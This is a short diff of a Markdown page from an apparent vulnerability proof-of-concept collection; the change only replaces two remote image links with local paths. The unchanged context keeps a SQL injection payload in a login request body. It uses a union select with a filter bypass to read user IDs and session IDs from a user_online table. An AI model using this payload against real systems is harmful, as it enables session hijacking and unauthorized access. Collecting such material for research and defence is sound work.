@@ -15,9 +15,9 @@ Content-Length: 2
 
 USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1**
 ```
-![image](https://github.com/wy876/POC/assets/139549762/55ba1ee3-215b-4fd2-8c0c-0694a20f6bfd)
+![image](../../images/55ba1ee3-215b-4fd2-8c0c-0694a20f6bfd.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/3d0399a3-9fe9-46d9-b725-12acb84d422c)
+![image](../../images/3d0399a3-9fe9-46d9-b725-12acb84d422c.png)
 
 
 ## 漏洞来源
